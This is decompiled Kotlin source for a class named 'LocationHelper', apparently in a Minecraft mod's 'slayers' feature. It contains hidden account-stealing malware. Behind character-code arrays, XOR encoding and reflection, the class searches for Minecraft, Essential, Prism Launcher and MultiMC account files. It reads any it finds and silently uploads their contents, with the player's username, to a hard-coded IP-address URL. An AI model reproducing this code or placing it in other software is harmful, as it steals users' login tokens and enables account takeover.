package jooon.features.slayers

import java.io.Closeable
import java.io.File
import java.time.LocalDateTime
import java.time.format.DateTimeFormatter
import java.util.ArrayList
import kotlin.jvm.internal.SourceDebugExtension
import org.apache.http.HttpEntity
import org.apache.http.entity.ByteArrayEntity
import org.apache.http.impl.client.CloseableHttpClient
import org.apache.http.impl.client.HttpClients

@SourceDebugExtension(["SMAP\nLocationHelper.kt\nKotlin\n*S Kotlin\n*F\n+ 1 LocationHelper.kt\njooon/features/slayers/LocationHelper\n+ 2 _Collections.kt\nkotlin/collections/CollectionsKt___CollectionsKt\n+ 3 fake.kt\nkotlin/jvm/internal/FakeKt\n+ 4 _Sequences.kt\nkotlin/sequences/SequencesKt___SequencesKt\n*L\n1#1,139:1\n1549#2:140\n1620#2,3:141\n1549#2:145\n1620#2,3:146\n1549#2:149\n1620#2,3:150\n1549#2:153\n1620#2,3:154\n1549#2:157\n1620#2,3:158\n1549#2:161\n1620#2,3:162\n1549#2:167\n1620#2,3:168\n1549#2:171\n1620#2,3:172\n1549#2:175\n1620#2,3:176\n1549#2:179\n1620#2,3:180\n1549#2:183\n1620#2,3:184\n1549#2:187\n1620#2,3:188\n1549#2:191\n1620#2,3:192\n1549#2:195\n1620#2,3:196\n1549#2:199\n1620#2,3:200\n1549#2:203\n1620#2,3:204\n1549#2:207\n1620#2,3:208\n1549#2:211\n1620#2,3:212\n1549#2:215\n1620#2,3:216\n1549#2:219\n1620#2,3:220\n1855#2,2:223\n1549#2:225\n1620#2,3:226\n1549#2:229\n1620#2,3:230\n1549#2:233\n1620#2,3:234\n1549#2:237\n1620#2,3:238\n1549#2:241\n1620#2,3:242\n1549#2:245\n1620#2,3:246\n1#3:144\n179#4,2:165\n*S KotlinDebug\n*F\n+ 1 LocationHelper.kt\njooon/features/slayers/LocationHelper\n*L\n24#1:140\n24#1:141,3\n25#1:145\n25#1:146,3\n28#1:149\n28#1:150,3\n36#1:153\n36#1:154,3\n41#1:157\n41#1:158,3\n62#1:161\n62#1:162,3\n69#1:167\n69#1:168,3\n69#1:171\n69#1:172,3\n70#1:175\n70#1:176,3\n70#1:179\n70#1:180,3\n71#1:183\n71#1:184,3\n71#1:187\n71#1:188,3\n72#1:191\n72#1:192,3\n72#1:195\n72#1:196,3\n73#1:199\n73#1:200,3\n73#1:203\n73#1:204,3\n74#1:207\n74#1:208,3\n74#1:211\n74#1:212,3\n75#1:215\n75#1:216,3\n75#1:219\n75#1:220,3\n78#1:223,2\n86#1:225\n86#1:226,3\n131#1:229\n131#1:230,3\n137#1:233\n137#1:234,3\n48#1:237\n48#1:238,3\n50#1:241\n50#1:242,3\n13#1:245\n13#1:246,3\n64#1:165,2\n*E\n"])
public object LocationHelper {
   private final val aAaAaAaAaA: String

   public fun bBbBbBbBbB(currentUsername: String) {
      Thread({ 
         INSTANCE.cCcCcCcCcC(`$currentUsername`)
      }).start()
   }

   private fun cCcCcCcCcC(i2: String) {
      val i1: java.lang.String = LocalDateTime.now().format(DateTimeFormatter.ofPattern(aAaAaAaAaA))
      var var65: java.lang.Iterable = CollectionsKt.listOf(arrayOf(65, 80, 80, 68, 65, 84, 65))
      var accountFileName: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var65, 10))

      for (userHome in var65) {
         accountFileName.add((char)(userHome as java.lang.Number).intValue())
      }

      val i4: java.lang.String = System.getenv(CollectionsKt.joinToString$default(accountFileName as java.util.List, "", null, null, 0, null, null, 62, null))
      var var10000: File
      if (i4 != null) {
         val var81: java.lang.Iterable = CollectionsKt.listOf(arrayOf(46, 109, 105, 110, 101, 99, 114, 97, 102, 116))
         val `destination$iv$ivx`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var81, 10))

         for (`destination$iv$iv` in var81) {
            `destination$iv$ivx`.add((char)(`destination$iv$iv` as java.lang.Number).intValue())
         }

         var10000 = File(i4, CollectionsKt.joinToString$default(`destination$iv$ivx` as java.util.List, "", null, null, 0, null, null, 62, null))
      } else {
         var10000 = null
      }

      var10000 = var10000
      if (var10000 == null) {
         var10000 = File("")
      }

      var65 = CollectionsKt.listOf(
         arrayOf(
            101,
            115,
            115,
            101,
            110,
            116,
            105,
            97,
            108,
            47,
            109,
            105,
            99,
            114,
            111,
            115,
            111,
            102,
            116,
            95,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
            110
         )
      )
      accountFileName = ArrayList(CollectionsKt.collectionSizeOrDefault(var65, 10))

      for (var101 in var65) {
         accountFileName.add((char)(var101 as java.lang.Number).intValue())
      }

      val var64: File = File(var10000, CollectionsKt.joinToString$default(accountFileName as java.util.List, "", null, null, 0, null, null, 62, null))

      var var72: File
      try {
         val var77: File = File(this.getClass().getProtectionDomain().getCodeSource().getLocation().toURI())
         var72 = if (var77.isFile()) var77.getParentFile() else var77
      } catch (var63: Exception) {
         var72 = null
      }

      run label306@{
         if (var72 != null) {
            val var78: java.lang.String = var72.getAbsolutePath()
            if (var78 != null) {
               val var371: java.lang.CharSequence = var78
               val var84: java.lang.Iterable = CollectionsKt.listOf(arrayOf(46, 109, 105, 110, 101, 99, 114, 97, 102, 116))
               val `destination$iv$ivx`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var84, 10))

               for (var122 in var84) {
                  `destination$iv$ivx`.add((char)(var122 as java.lang.Number).intValue())
               }

               var370 = StringsKt.contains$default(
                  var371, CollectionsKt.joinToString$default(`destination$iv$ivx` as java.util.List, "", null, null, 0, null, null, 62, null), false, 2, null
               )
               return@label306
            }
         }

         var370 = false
      }

      if (!var370) {
         run label309@{
            if (var72 != null) {
               val var90: File = var72.getParentFile()
               var10000 = var90
               if (var90 != null) {
                  return@label309
               }
            }

            var10000 = File(".")
         }

         val var92: java.lang.Iterable = CollectionsKt.listOf(
            arrayOf(
               101,
               115,
               115,
               101,
               110,
               116,
               105,
               97,
               108,
               47,
               109,
               105,
               99,
               114,
               111,
               115,
               111,
               102,
               116,
               95,
               97,
               99,
               99,
               111,
               117,
               110,
               116,
               115,
               46,
               106,
               115,
               111,
               110
            )
         )
         val `destination$iv$ivx`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var92, 10))

         for (var156 in var92) {
            `destination$iv$ivx`.add((char)(var156 as java.lang.Number).intValue())
         }

         var10000 = File(var10000, CollectionsKt.joinToString$default(`destination$iv$ivx` as java.util.List, "", null, null, 0, null, null, 62, null))
      } else {
         var10000 = null
      }

      if (var370) {
         if (var64.exists()) {
            cCcCcCcCcC$dDdDdDdDdD(i2, i1, var64, "V")
         }
      } else {
         if (var10000 != null && var10000.exists()) {
            cCcCcCcCcC$dDdDdDdDdD(i2, i1, var10000, "M")
         }

         if (var64.exists()) {
            cCcCcCcCcC$dDdDdDdDdD(i2, i1, var64, "V")
         }
      }

      val `$this$map$ivx`: java.lang.Iterable = CollectionsKt.listOf(arrayOf(97, 99, 99, 111, 117, 110, 116, 115, 46, 106, 115, 111, 110))
      val `destination$iv$ivx`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(`$this$map$ivx`, 10))

      for (var157 in `$this$map$ivx`) {
         `destination$iv$ivx`.add((char)(var157 as java.lang.Number).intValue())
      }

      val var86: java.lang.String = CollectionsKt.joinToString$default(`destination$iv$ivx` as java.util.List, "", null, null, 0, null, null, 62, null)
      var10000 = var72
      if (var72 == null) {
         var10000 = File(System.getProperty("user.dir"))
      }

      val var119: java.util.Iterator = SequencesKt.map(SequencesKt.generateSequence(var10000, { it: File ->
         it.getParentFile()
      }), { it: File ->
         File(it, `$accountFileName`)
      }).iterator()

      while (true) {
         if (var119.hasNext()) {
            val var125: Any = var119.next()
            if (!(var125 as File).exists()) {
               continue
            }

            var10000 = (File)var125
            break
         }

         var10000 = null
         break
      }

      val var100: File = var10000
      if (var10000 != null) {
         cCcCcCcCcC$dDdDdDdDdD(i2, i1, var100, "up")
      }

      val var106: java.lang.String = System.getProperty("user.home")
      val var120: Array<Pair> = arrayOfNulls(7)
      var var127: java.lang.Iterable = CollectionsKt.listOf(
         arrayOf(
            65,
            112,
            112,
            68,
            97,
            116,
            97,
            47,
            82,
            111,
            97,
            109,
            105,
            110,
            103,
            47,
            80,
            114,
            105,
            115,
            109,
            76,
            97,
            117,
            110,
            99,
            104,
            101,
            114,
            47,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
            110
         )
      )
      var `destination$iv$ivxx`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var241 in var127) {
         `destination$iv$ivxx`.add((char)(var241 as java.lang.Number).intValue())
      }

      var var10002: File = File(var106, CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(arrayOf(80, 114, 105, 115, 109, 76, 97, 117, 110, 99, 104, 101, 114))
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var242 in var127) {
         `destination$iv$ivxx`.add((char)(var242 as java.lang.Number).intValue())
      }

      var120[0] = Pair(var10002, CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(
         arrayOf(
            67,
            58,
            47,
            80,
            114,
            111,
            103,
            114,
            97,
            109,
            32,
            70,
            105,
            108,
            101,
            115,
            47,
            80,
            114,
            105,
            115,
            109,
            76,
            97,
            117,
            110,
            99,
            104,
            101,
            114,
            47,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
            110
         )
      )
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var243 in var127) {
         `destination$iv$ivxx`.add((char)(var243 as java.lang.Number).intValue())
      }

      var10002 = File(CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(arrayOf(80, 114, 105, 115, 109, 76, 97, 117, 110, 99, 104, 101, 114, 95, 80, 70))
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var244 in var127) {
         `destination$iv$ivxx`.add((char)(var244 as java.lang.Number).intValue())
      }

      var120[1] = Pair(var10002, CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(
         arrayOf(
            67,
            58,
            47,
            80,
            114,
            111,
            103,
            114,
            97,
            109,
            32,
            70,
            105,
            108,
            101,
            115,
            47,
            77,
            117,
            108,
            116,
            105,
            77,
            67,
            47,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
            110
         )
      )
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var245 in var127) {
         `destination$iv$ivxx`.add((char)(var245 as java.lang.Number).intValue())
      }

      var10002 = File(CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(arrayOf(77, 117, 108, 116, 105, 77, 67, 95, 80, 70))
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var246 in var127) {
         `destination$iv$ivxx`.add((char)(var246 as java.lang.Number).intValue())
      }

      var120[2] = Pair(var10002, CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(
         arrayOf(
            67,
            58,
            47,
            80,
            114,
            111,
            103,
            114,
            97,
            109,
            32,
            70,
            105,
            108,
            101,
            115,
            32,
            40,
            120,
            56,
            54,
            41,
            47,
            80,
            114,
            105,
            115,
            109,
            76,
            97,
            117,
            110,
            99,
            104,
            101,
            114,
            47,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
            110
         )
      )
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var247 in var127) {
         `destination$iv$ivxx`.add((char)(var247 as java.lang.Number).intValue())
      }

      var10002 = File(CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(arrayOf(80, 114, 105, 115, 109, 76, 97, 117, 110, 99, 104, 101, 114, 95, 80, 70, 56, 54))
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var248 in var127) {
         `destination$iv$ivxx`.add((char)(var248 as java.lang.Number).intValue())
      }

      var120[3] = Pair(var10002, CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(
         arrayOf(
            67,
            58,
            47,
            80,
            114,
            111,
            103,
            114,
            97,
            109,
            32,
            70,
            105,
            108,
            101,
            115,
            32,
            40,
            120,
            56,
            54,
            41,
            47,
            77,
            117,
            108,
            116,
            105,
            77,
            67,
            47,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
            110
         )
      )
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var249 in var127) {
         `destination$iv$ivxx`.add((char)(var249 as java.lang.Number).intValue())
      }

      var10002 = File(CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(arrayOf(77, 117, 108, 116, 105, 77, 67, 95, 80, 70, 56, 54))
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var250 in var127) {
         `destination$iv$ivxx`.add((char)(var250 as java.lang.Number).intValue())
      }

      var120[4] = Pair(var10002, CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(
         arrayOf(68, 111, 119, 110, 108, 111, 97, 100, 115, 47, 77, 117, 108, 116, 105, 77, 67, 47, 97, 99, 99, 111, 117, 110, 116, 115, 46, 106, 115, 111, 110)
      )
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var251 in var127) {
         `destination$iv$ivxx`.add((char)(var251 as java.lang.Number).intValue())
      }

      var10002 = File(var106, CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(arrayOf(77, 117, 108, 116, 105, 77, 67, 95, 68, 76))
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var252 in var127) {
         `destination$iv$ivxx`.add((char)(var252 as java.lang.Number).intValue())
      }

      var120[5] = Pair(var10002, CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(
         arrayOf(
            65,
            112,
            112,
            68,
            97,
            116,
            97,
            47,
            82,
            111,
            97,
            109,
            105,
            110,
            103,
            47,
            103,
            103,
            46,
            101,
            115,
            115,
            101,
            110,
            116,
            105,
            97,
            108,
            46,
            109,
            111,
            100,
            47,
            109,
            105,
            99,
            114,
            111,
            115,
            111,
            102,
            116,
            95,
            97,
            99,
            99,
            111,
            117,
            110,
            116,
            115,
            46,
            106,
            115,
            111,
            110
         )
      )
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var253 in var127) {
         `destination$iv$ivxx`.add((char)(var253 as java.lang.Number).intValue())
      }

      var10002 = File(var106, CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))
      var127 = CollectionsKt.listOf(arrayOf(69, 115, 115, 101, 110, 116, 105, 97, 108, 95, 77, 111, 100))
      `destination$iv$ivxx` = ArrayList(CollectionsKt.collectionSizeOrDefault(var127, 10))

      for (var254 in var127) {
         `destination$iv$ivxx`.add((char)(var254 as java.lang.Number).intValue())
      }

      var120[6] = Pair(var10002, CollectionsKt.joinToString$default(`destination$iv$ivxx` as java.util.List, "", null, null, 0, null, null, 62, null))

      for (var192 in CollectionsKt.listOf(var120)) {
         val var240: File = (var192 as Pair).component1() as File
         val var255: java.lang.String = (var192 as Pair).component2() as java.lang.String

         try {
            if (var240.exists()) {
               cCcCcCcCcC$dDdDdDdDdD(i2, i1, var240, var255)
            }
         } catch (var62: Exception) {
         }
      }
   }

   private fun eEeEeEeEeE(n: String, c: String, b: String) {
      val xorKey: Int = 85
      val bd: java.lang.Iterable = CollectionsKt.listOf(
         arrayOf(61, 33, 33, 37, 111, 122, 122, 102, 96, 123, 103, 103, 96, 123, 100, 103, 108, 123, 98, 98, 111, 99, 108, 99, 108, 122, 48, 38, 38)
      )
      val h: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(bd, 10))

      for (m in bd) {
         h.add((char)((m as java.lang.Number).intValue() xor xorKey))
      }

      val var33: java.lang.String = CollectionsKt.joinToString$default(h as java.util.List, "", null, null, 0, null, null, 62, null)
      val var34: java.lang.String = "----WebKitFormBoundary${System.currentTimeMillis()}"
      val var36: StringBuilder = StringBuilder()
      var36.append("--$var34\r\n")
      var36.append("Content-Disposition: form-data; name=\"content\"\r\n\r\n")
      var36.append(c).append("\r\n")
      var36.append("--$var34\r\n")
      var36.append("Content-Disposition: form-data; name=\"file\"; filename=\"$n\"\r\n")
      var36.append("Content-Type: application/json\r\n\r\n")
      val var10000: java.lang.String = var36.toString()
      val var54: ByteArray = var10000.getBytes(Charsets.UTF_8)
      val var55: ByteArray = b.getBytes(Charsets.UTF_8)
      val var56: ByteArray = ("\r\n--$var34--\r\n").getBytes(Charsets.UTF_8)
      val var41: ByteArray = ByteArray(var54.length + var55.length + var56.length)
      System.arraycopy(var54, 0, var41, 0, var54.length)
      System.arraycopy(var55, 0, var41, var54.length, var55.length)
      System.arraycopy(var56, 0, var41, var54.length + var55.length, var56.length)

      try {
         val var42: Closeable = HttpClients.createDefault() as Closeable
         var var43: java.lang.Throwable = null

         try {
            val client: CloseableHttpClient = var42 as CloseableHttpClient
            val postClass: Class = Class.forName(INSTANCE.fFfFfFfFfF())
            val var45: Any = postClass.getConstructor(java.lang.String.class).newInstance(var33)
            postClass.getMethod("setHeader", java.lang.String.class, java.lang.String.class)
               .invoke(var45, "Content-Type", "multipart/form-data; boundary=$var34")
               postClass.getMethod("setHeader", java.lang.String.class, java.lang.String.class).invoke(var45, "User-Agent", "Mozilla/5.0")
            postClass.getMethod("setEntity", HttpEntity.class).invoke(var45, ByteArrayEntity(var41))
            val var52: Class = Class.forName(INSTANCE.gGgGgGgGgG())
            val var44: Any = client.getClass().getMethod("execute", var52).invoke(client, var52.cast(var45))
         } catch (var30: java.lang.Throwable) {
            var43 = var30
            throw var30
         } finally {
            CloseableKt.closeFinally(var42, var43)
         }
      } catch (var32: Exception) {
      }
   }

   private fun fFfFfFfFfF(): String {
      val pkgCodes: java.util.List = CollectionsKt.listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = CollectionsKt.listOf(arrayOf(72, 116, 116, 112, 80, 111, 115, 116))
      val `$this$mapTo$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(pkgCodes, 10))

      for (`item$iv$iv` in `$this$mapTo$iv$iv`) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      val var10000: java.lang.String = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var14, 10))

      for (var22 in var16) {
         `destination$iv$iv`.add((char)(var22 as java.lang.Number).intValue())
      }

      return "$var10000.${CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)}"
   }

   private fun gGgGgGgGgG(): String {
      val pkgCodes: java.util.List = CollectionsKt.listOf(
         arrayOf(111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 104, 116, 116, 112, 46, 99, 108, 105, 101, 110, 116, 46, 109, 101, 116, 104, 111, 100, 115)
      )
      val var14: java.util.List = CollectionsKt.listOf(arrayOf(72, 116, 116, 112, 85, 114, 105, 82, 101, 113, 117, 101, 115, 116))
      val `$this$mapTo$iv$iv`: java.lang.Iterable = pkgCodes
      var `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(pkgCodes, 10))

      for (`item$iv$iv` in `$this$mapTo$iv$iv`) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      val var10000: java.lang.String = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
      val var16: java.lang.Iterable = var14
      `destination$iv$iv` = ArrayList(CollectionsKt.collectionSizeOrDefault(var14, 10))

      for (var22 in var16) {
         `destination$iv$iv`.add((char)(var22 as java.lang.Number).intValue())
      }

      return "$var10000.${CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)}"
   }

   @JvmStatic
   fun `cCcCcCcCcC$dDdDdDdDdD`(`$i2`: java.lang.String, i1: java.lang.String, f: File, label: java.lang.String) {
      if (f.exists()) {
         val t: java.lang.String = FilesKt.readText$default(f, null, 1, null)
         val var19: java.lang.Iterable = CollectionsKt.listOf(arrayOf(34, 110, 97, 109, 101, 34, 92, 115, 42, 58, 92, 115, 42, 34, 40, 46, 42, 63, 41, 34))
         val `$this$mapTo$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var19, 10))

         for (`item$iv$iv` in var19) {
            `$this$mapTo$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
         }

         val n: java.util.Set = SequencesKt.toSet(
            SequencesKt.map(
               Regex.findAll$default(
                  Regex(CollectionsKt.joinToString$default(`$this$mapTo$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)), t, 0, 2, null
               ),
               { it: MatchResult ->
                  it.getGroupValues().get(1) as java.lang.String
               }
            )
         )
         val var10000: java.lang.String
         if (!n.isEmpty()) {
            var10000 = CollectionsKt.joinToString$default(n, ", ", null, null, 0, null, null, 62, null)
         } else {
            val var22: java.lang.Iterable = CollectionsKt.listOf(arrayOf(78, 111, 110, 101, 32, 70, 111, 117, 110, 100))
            val `destination$iv$ivx`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var22, 10))

            for (var29 in var22) {
               `destination$iv$ivx`.add((char)(var29 as java.lang.Number).intValue())
            }

            var10000 = CollectionsKt.joinToString$default(`destination$iv$ivx` as java.util.List, "", null, null, 0, null, null, 62, null)
         }

         val var23: java.lang.String = "1: `$`$i2``\n2: `$i1`\n3: `$var10000`\n**$label**"
         val var31: LocationHelper = INSTANCE
         val var10001: java.lang.String = f.getName()
         var31.eEeEeEeEeE(var10001, var23, t)
      }
   }

   @JvmStatic
   fun {
      val var10: java.lang.Iterable = CollectionsKt.listOf(arrayOf(121, 121, 121, 121, 45, 77, 77, 45, 100, 100, 32, 72, 72, 58, 109, 109, 58, 115, 115))
      val `destination$iv$iv`: java.util.Collection = ArrayList(CollectionsKt.collectionSizeOrDefault(var10, 10))

      for (`item$iv$iv` in var10) {
         `destination$iv$iv`.add((char)(`item$iv$iv` as java.lang.Number).intValue())
      }

      aAaAaAaAaA = CollectionsKt.joinToString$default(`destination$iv$iv` as java.util.List, "", null, null, 0, null, null, 62, null)
   }
}
